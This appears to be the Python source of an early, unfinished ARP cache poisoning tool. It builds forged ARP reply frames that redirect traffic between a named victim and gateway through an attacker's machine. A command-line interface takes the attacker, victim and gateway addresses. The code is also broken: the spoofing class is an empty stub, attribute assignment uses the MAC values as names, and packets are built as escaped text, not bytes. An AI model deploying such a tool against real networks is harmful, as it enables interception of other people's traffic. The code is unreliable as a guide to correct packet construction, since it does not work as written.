#!/usr/bin/env python3
# https://github.com/EONRaider/Arp-Spoofer

__author__ = 'EONRaider @ keybase.io/eonraider'

"""
A low-level ARP cache poisoning (a.k.a "ARP spoofing") tool.
"""

import argparse
import re
import socket


class ARPPacket(object):

    def __init__(self, attacker_mac: str, gateway_mac: str, victim_mac: str,
                 gateway_ip: str, victim_ip: str):

        self.gateway_ip = socket.inet_aton(gateway_ip)
        self.victim_ip = socket.inet_aton(victim_ip)
        for attr in attacker_mac, gateway_mac, victim_mac:
            setattr(self, attr, self._hexlify_mac(attr))
        self.gateway_eth_header = self._build_ethernet_header(self.gateway_mac)
        self.victim_eth_header = self._build_ethernet_header(self.victim_mac)
        self.gateway_arp_packet = None
        self.victim_arp_packet = None

    @staticmethod
    def __validate_mac(mac_addr: str) -> bool:
        is_valid_mac = re.match(r'([0-9A-F]{2}[:]){5}[0-9A-F]{2}|'
                                r'([0-9A-F]{2}[-]){5}[0-9A-F]{2}',
                                string=mac_addr,
                                flags=re.IGNORECASE)
        try:
            return bool(is_valid_mac.group())  # True if match
        except AttributeError:
            return False

    def _hexlify_mac(self, mac_addr: str) -> str:
        """
        Transform a MAC address string from IEEE 802 standard to a
        hexadecimal byte sequence.
        Ex: 'AB:BC:CD:12:23:34' to '\xAB\xBC\xCD\x12\x23\x34'.
        """

        if self.__validate_mac(mac_addr) is False:
            raise SystemExit('Invalid MAC address.')
        octets = re.split(r'[:-]', mac_addr, flags=re.IGNORECASE)
        return r''.join(r'\x' + octet.upper() for octet in octets)

    def _build_ethernet_header(self, mac_addr: str) -> str:
        """
        Build an Ethernet frame header as defined by the IEEE 802.3
        standard.

        Returns:
            A raw string with a hexadecimal where 'mac_addr' is the
                source address, 'attacker_mac' is the destination
                address and '\x08\x06' is the Ethertype code of ARP.
        """
        return mac_addr + self.attacker_mac + r'\x08\x06'

    @staticmethod
    def _build_arp_header() -> str:
        """
        Build Address Resolution Protocol (ARP) packets per the
        structure defined by RFC 826 under 'Packet Format'.
        Source: https://tools.ietf.org/html/rfc826
        """

        hdwr_addr = r'\x00\x01'   # Hardware address space = Ethernet
        proto_addr = r'\x08\x00'  # Protocol address space = IP
        hdwr_addr_len = r'\x06'   # Length of hardware address
        proto_addr_len = r'\x04'  # Length of protocol address
        opcode = r'\x00\x02'      # Operation code = REPLY
        arp_header = r''.join((hdwr_addr, proto_addr, hdwr_addr_len,
                               proto_addr_len, opcode))
        return arp_header

    def packets(self) -> tuple:
        arp_header = self._build_arp_header()

        self.gateway_arp_packet = r''.join((self.gateway_eth_header,
                                            arp_header,
                                            self.attacker_mac,
                                            self.victim_ip,
                                            self.gateway_mac,
                                            self.gateway_ip))

        self.victim_arp_packet = r''.join((self.victim_eth_header,
                                           arp_header,
                                           self.attacker_mac,
                                           self.gateway_ip,
                                           self.victim_mac,
                                           self.victim_ip))

        return self.gateway_arp_packet, self.victim_arp_packet


class Spoofer(object):
    def __init__(self):
        pass

    def execute(self):
        pass


if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description='Execute ARP cache poisoning attacks (a.k.a "ARP '
                    'spoofing") on local networks.')
    parser.add_argument('interface', type=str,
                        help='Interface on the attacker machine to '
                             'send/receive packets from.')
    parser.add_argument('--attacker-mac', type=str, required=True,
                        help='MAC address of the network interface controller '
                             'used by the attacker.')
    parser.add_argument('--gate-mac', type=str, required=True,
                        help='MAC address of the network interface controller '
                             'of the gateway.')
    parser.add_argument('--victim-mac', type=str, required=True,
                        help='MAC address of the network interface controller '
                             'of the victim.')
    parser.add_argument('--gate-ip', type=str, required=True,
                        help='IP address of the gateway.')
    parser.add_argument('--victim-ip', type=str, required=True,
                        help='IP address of the victim.')
